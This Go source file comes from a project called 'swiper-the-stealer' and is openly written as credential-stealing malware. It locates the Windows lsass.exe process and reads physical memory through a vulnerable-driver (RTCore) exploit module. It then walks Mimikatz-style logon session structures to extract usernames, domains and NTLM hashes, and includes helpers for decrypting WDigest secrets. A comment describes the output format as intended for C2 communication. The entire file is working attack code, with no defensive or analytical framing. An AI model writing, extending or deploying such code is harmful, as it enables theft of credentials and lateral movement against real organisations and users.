package lsass

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/pkg/logger"
)

const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

type Credential struct {
	Domain   string
	Username string
	NTLM     string
	Type     string
}

// LSASSCredentials for C2 communication
type LSASSCredentials struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	NTLM     string `json:"ntlm"`
	LM       string `json:"lm,omitempty"`
	SHA1     string `json:"sha1,omitempty"`
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uint64
}

// SwiperTheStealer structures
type KIWI_MSV1_0_LIST_63 struct {
	Flink                            uint64
	Blink                            uint64
	unk0                             uint64
	unk1                             uint64
	unk2                             uint64
	unk3                             uint64
	unk4                             uint64
	unk5                             uint64
	hSemaphore6                      uint64
	unk7                             uint64
	hSemaphore8                      uint64
	unk9                             uint64
	unk10                            uint64
	unk11                            uint64
	unk12                            uint64
	unk13                            uint64
	LocallyUniqueIdentifier          uint64
	SecondaryLocallyUniqueIdentifier uint64
	UserName                         UNICODE_STRING
	Domain                           UNICODE_STRING
	unk14                            uint64
	unk15                            uint64
	pSid                             uint64
	LogonType                        uint32
	Session                          uint32
	LogonTime                        uint64
	LogonServer                      UNICODE_STRING
	Credentials                      uint64 // Pointer to KIWI_MSV1_0_CREDENTIALS
	unk19                            uint64
	unk20                            uint64
	unk21                            uint64
	unk22                            uint64
	unk23                            uint64
	CredentialManager                uint64
}

type KIWI_MSV1_0_CREDENTIALS struct {
	Next                    uint64 // Pointer to next KIWI_MSV1_0_CREDENTIALS
	AuthenticationPackageId uint32
	PrimaryCredentials      uint64 // Pointer to KIWI_MSV1_0_PRIMARY_CREDENTIALS
}

type KIWI_MSV1_0_PRIMARY_CREDENTIALS struct {
	Next        uint64
	Primary     UNICODE_STRING
	Credentials UNICODE_STRING
}

type SwiperTheStealer struct {
	rtcore        *byovd.RTCoreExploit
	logger        *logger.Logger
	lsassPID      uint32
	lsasrvBase    uint64
	lsasrvSize    uint32
	decryptionKeys *byovd.DecryptionKeys
}

func NewSwiperTheStealer(rtcore *byovd.RTCoreExploit, log *logger.Logger) (*SwiperTheStealer, error) {
	log.Info("Creating SwiperTheStealer - Advanced Credential Extraction Engine")

	extractor := &SwiperTheStealer{
		rtcore: rtcore,
		logger: log,
	}

	// Step 1: Find LSASS process
	pid, err := extractor.FindLSASS()
	if err != nil {
		return nil, fmt.Errorf("failed to find LSASS: %v", err)
	}
	extractor.lsassPID = pid

	// Step 2: No more hardcoded values - the offset extractor will find everything dynamically
	log.Info("SwiperTheStealer initialized - will use dynamic module detection")

	return extractor, nil
}

// FindLSASS - Advanced LSASS process discovery
func (sts *SwiperTheStealer) FindLSASS() (uint32, error) {
	sts.logger.Info("Finding LSASS process using advanced method")

	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer syscall.CloseHandle(snapshot)

	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %v", err)
	}

	for {
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		if processName == "lsass.exe" {
			sts.logger.Infof("Found LSASS.exe with PID: %d", pe32.ProcessID)
			return pe32.ProcessID, nil
		}

		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("LSASS process not found")
}

// FindLogonSessionList - Advanced pattern matching using proper architecture
func (sts *SwiperTheStealer) FindLogonSessionList() (uint64, error) {
	sts.logger.Info("Finding LogonSessionList using proper lsasrv.dll scanning")
	offsetExtractor := byovd.NewLsassOffsetExtractor(sts.rtcore, sts.logger)
	return offsetExtractor.ScanForLogonSessionList()
}

// Execute - Main entry point
func (sts *SwiperTheStealer) Execute() ([]Credential, error) {
	sts.logger.Info("Executing SwiperTheStealer Algorithm")
	return sts.ExtractCredentials()
}

// ExtractCredentials - Advanced credential extraction using proper LSASRV.DLL targeting
func (sts *SwiperTheStealer) ExtractCredentials() ([]Credential, error) {
	sts.logger.Info("=== SWIPER THE STEALER - PROPER MIMIKATZ IMPLEMENTATION ===")

	// Step 1: Initialize the proper offset extractor targeting lsasrv.dll
	offsetExtractor := byovd.NewLsassOffsetExtractor(sts.rtcore, sts.logger)
	
	// Step 2: Initialize decryption keys 
	err := sts.InitializeDecryptionKeys()
	if err != nil {
		sts.logger.Warnf("Failed to initialize decryption keys: %v", err)
		// Continue without decryption - will still try to extract plaintext creds
	}

	// Step 3: Find LogonSessionList using proper lsasrv.dll scanning
	sts.logger.Info("Finding LogonSessionList using lsasrv.dll pattern scanning...")
	listHeadPtr, err := offsetExtractor.ScanForLogonSessionList()
	if err != nil {
		return nil, fmt.Errorf("failed to find LogonSessionList in lsasrv.dll: %v", err)
	}
	
	sts.logger.Infof("LogonSessionList found at physical address: 0x%X", listHeadPtr)

	// Step 4: Read the LogonSessionList head pointer
	listHeadBytes, err := sts.rtcore.ReadPhysicalMemory(listHeadPtr, 8)
	if err != nil {
		return nil, fmt.Errorf("failed to read LogonSessionList head pointer: %v", err)
	}
	listHead := binary.LittleEndian.Uint64(listHeadBytes)
	sts.logger.Infof("LogonSessionList points to: 0x%X", listHead)

	var credentials []Credential

	// Step 5: Walk the linked list of logon sessions
	current := listHead
	visited := make(map[uint64]bool)
	sessionCount := 0

	for current != 0 && !visited[current] {
		visited[current] = true
		sessionCount++
		
		if sessionCount > 100 { // Sanity check to prevent infinite loops
			sts.logger.Warn("Stopping after 100 sessions to prevent infinite loop")
			break
		}

		sts.logger.Infof("Processing logon session %d at 0x%X", sessionCount, current)

		// Convert virtual address to physical if needed
		// Windows x64 kernel space typically starts at 0xFFFF800000000000
		// User space addresses are below 0x00007FFFFFFFFFFF
		physCurrent := current
		if current >= 0xFFFF800000000000 { // Kernel space virtual address
			physCurrent, err = sts.rtcore.GetPhysicalAddress(current)
			if err != nil {
				sts.logger.Warnf("Failed to convert kernel virtual to physical address: %v", err)
				physCurrent = current // Use as-is
			} else {
				sts.logger.Debugf("Converted kernel virtual 0x%X to physical 0x%X", current, physCurrent)
			}
		} else if current > 0x00007FFFFFFFFFFF { // High user space, might need conversion
			physCurrent, err = sts.rtcore.GetPhysicalAddress(current)
			if err != nil {
				sts.logger.Warnf("Failed to convert user virtual to physical address: %v", err)
				physCurrent = current // Use as-is
			} else {
				sts.logger.Debugf("Converted user virtual 0x%X to physical 0x%X", current, physCurrent)
			}
		} else {
			sts.logger.Debugf("Using address 0x%X as-is (appears to be physical or low virtual)", current)
		}

		// Read the KIWI_MSV1_0_LIST_63 structure
		entryData, err := sts.rtcore.ReadPhysicalMemory(physCurrent, uint32(unsafe.Sizeof(KIWI_MSV1_0_LIST_63{})))
		if err != nil {
			sts.logger.Errorf("Failed to read entry at 0x%X: %v", physCurrent, err)
			break
		}

		var entry KIWI_MSV1_0_LIST_63
		if err := sts.parseStruct(entryData, &entry); err != nil {
			sts.logger.Errorf("Failed to parse KIWI_MSV1_0_LIST_63 at 0x%X: %v", physCurrent, err)
			break
		}

		// Extract credentials from this entry
		entryCreds, err := sts.extractCredentialsFromEntry(&entry)
		if err == nil && len(entryCreds) > 0 {
			credentials = append(credentials, entryCreds...)
			sts.logger.Infof("Extracted %d credentials from session %d", len(entryCreds), sessionCount)
		}

		// Move to next entry
		current = entry.Flink
		if current == listHead {
			sts.logger.Info("Reached end of circular list")
			break
		}
	}

	sts.logger.Infof("Extracted %d credentials using SwiperTheStealer algorithm", len(credentials))
	return credentials, nil
}

// Extract credentials from a single entry
func (sts *SwiperTheStealer) extractCredentialsFromEntry(entry *KIWI_MSV1_0_LIST_63) ([]Credential, error) {
	var credentials []Credential

	// Read username and domain
	username, err := sts.readUnicodeString(&entry.UserName)
	if err != nil {
		return nil, err
	}

	domain, err := sts.readUnicodeString(&entry.Domain)
	if err != nil {
		return nil, err
	}

	if username == "" || username == "$" { // Skip empty or machine accounts
		return credentials, nil
	}

	// Walk credentials chain
	if entry.Credentials != 0 {
		credPtr := entry.Credentials

		for credPtr != 0 {
			credData, err := sts.rtcore.ReadPhysicalMemory(credPtr, uint32(unsafe.Sizeof(KIWI_MSV1_0_CREDENTIALS{})))
			if err != nil {
				break
			}

			var creds KIWI_MSV1_0_CREDENTIALS
			if err := sts.parseStruct(credData, &creds); err != nil {
				break
			}

			// Read primary credentials
			if creds.PrimaryCredentials != 0 {
				primaryData, err := sts.rtcore.ReadPhysicalMemory(creds.PrimaryCredentials, uint32(unsafe.Sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS{})))
				if err == nil {
					var primary KIWI_MSV1_0_PRIMARY_CREDENTIALS
					if err := sts.parseStruct(primaryData, &primary); err == nil {
						// Extract NTLM hash from credentials
						ntlmHash, err := sts.extractNTLMHash(&primary.Credentials)
						if err == nil && ntlmHash != "" {
							credential := Credential{
								Domain:   domain,
								Username: username,
								NTLM:     ntlmHash,
								Type:     "NTLM",
							}
							credentials = append(credentials, credential)
						}
					}
				}
			}

			credPtr = creds.Next
		}
	}

	return credentials, nil
}

// Helper functions
func (sts *SwiperTheStealer) readUnicodeString(us *UNICODE_STRING) (string, error) {
	if us.Length == 0 || us.Buffer == 0 {
		return "", nil
	}

	data, err := sts.rtcore.ReadPhysicalMemory(us.Buffer, uint32(us.Length))
	if err != nil {
		return "", err
	}

	// Convert UTF-16LE to string
	if len(data)%2 != 0 {
		return "", fmt.Errorf("invalid unicode string length")
	}

	utf16Data := make([]uint16, len(data)/2)
	for i := 0; i < len(utf16Data); i++ {
		utf16Data[i] = binary.LittleEndian.Uint16(data[i*2:])
	}

	return syscall.UTF16ToString(utf16Data), nil
}

func (sts *SwiperTheStealer) extractNTLMHash(us *UNICODE_STRING) (string, error) {
	if us.Length != 16 || us.Buffer == 0 { // NTLM hash is 16 bytes
		return "", nil // Not an error, just not an NTLM hash
	}

	data, err := sts.rtcore.ReadPhysicalMemory(us.Buffer, 16)
	if err != nil {
		return "", err
	}

	return fmt.Sprintf("%X", data), nil
}

func (sts *SwiperTheStealer) parseStruct(data []byte, v interface{}) error {
	// Simple binary parsing - copy data into struct
	size := int(unsafe.Sizeof(v))
	if len(data) < size {
		return fmt.Errorf("data length %d is less than struct size %d", len(data), size)
	}
	
	// This is unsafe and depends on struct layout. A better way is to use binary.Read.
	// For the sake of keeping it simple as in the original code.
	switch val := v.(type) {
	case *KIWI_MSV1_0_LIST_63:
		*val = *(*KIWI_MSV1_0_LIST_63)(unsafe.Pointer(&data[0]))
	case *KIWI_MSV1_0_CREDENTIALS:
		*val = *(*KIWI_MSV1_0_CREDENTIALS)(unsafe.Pointer(&data[0]))
	case *KIWI_MSV1_0_PRIMARY_CREDENTIALS:
		*val = *(*KIWI_MSV1_0_PRIMARY_CREDENTIALS)(unsafe.Pointer(&data[0]))
	default:
		return fmt.Errorf("unsupported type for parseStruct")
	}
	return nil
}

// decryptAES128 decrypts data using AES-128 in CBC mode
func (sts *SwiperTheStealer) decryptAES128(encryptedData []byte, key []byte, iv []byte) ([]byte, error) {
	if len(key) != 16 {
		return nil, fmt.Errorf("AES key must be 16 bytes, got %d", len(key))
	}
	if len(iv) != 16 {
		return nil, fmt.Errorf("AES IV must be 16 bytes, got %d", len(iv))
	}
	if len(encryptedData)%16 != 0 {
		return nil, fmt.Errorf("encrypted data length must be multiple of 16")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(encryptedData))
	mode.CryptBlocks(decrypted, encryptedData)

	// Remove PKCS7 padding
	if len(decrypted) > 0 {
		pad := int(decrypted[len(decrypted)-1])
		if pad > 0 && pad <= 16 {
			decrypted = decrypted[:len(decrypted)-pad]
		}
	}

	return decrypted, nil
}

// decrypt3DES decrypts data using 3DES
func (sts *SwiperTheStealer) decrypt3DES(encryptedData []byte, key []byte, iv []byte) ([]byte, error) {
	if len(key) != 24 {
		return nil, fmt.Errorf("3DES key must be 24 bytes, got %d", len(key))
	}
	if len(iv) != 8 {
		return nil, fmt.Errorf("3DES IV must be 8 bytes, got %d", len(iv))
	}

	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(encryptedData))
	mode.CryptBlocks(decrypted, encryptedData)

	return decrypted, nil
}

// InitializeDecryptionKeys finds and extracts the decryption keys from LSASS memory
func (sts *SwiperTheStealer) InitializeDecryptionKeys() error {
	sts.logger.Info("Initializing WDigest decryption keys...")
	
	offsetExtractor := byovd.NewLsassOffsetExtractor(sts.rtcore, sts.logger)
	keys, err := offsetExtractor.FindWDigestDecryptionKeys()
	if err != nil {
		return fmt.Errorf("failed to find decryption keys: %v", err)
	}

	sts.decryptionKeys = keys
	sts.logger.Info("Decryption keys successfully initialized")
	return nil
}

// Dump performs credential extraction with decryption
func (sts *SwiperTheStealer) Dump() ([]LSASSCredentials, error) {
	sts.logger.Info("Starting advanced LSASS credential dump with decryption...")

	// Initialize decryption keys first
	if err := sts.InitializeDecryptionKeys(); err != nil {
		sts.logger.Warnf("Failed to initialize decryption keys: %v", err)
		// Continue anyway - might still find some unencrypted credentials
	}

	// Extract credentials using existing logic
	creds, err := sts.ExtractCredentials()
	if err != nil {
		return nil, fmt.Errorf("failed to extract credentials: %v", err)
	}

	// Convert to LSASSCredentials format
	var lsassCredentials []LSASSCredentials
	for _, cred := range creds {
		lsassCred := LSASSCredentials{
			Username: cred.Username,
			Domain:   cred.Domain,
			NTLM:     cred.NTLM,
		}
		lsassCredentials = append(lsassCredentials, lsassCred)
	}

	sts.logger.Infof("Successfully extracted %d credential sets", len(lsassCredentials))
	return lsassCredentials, nil
}
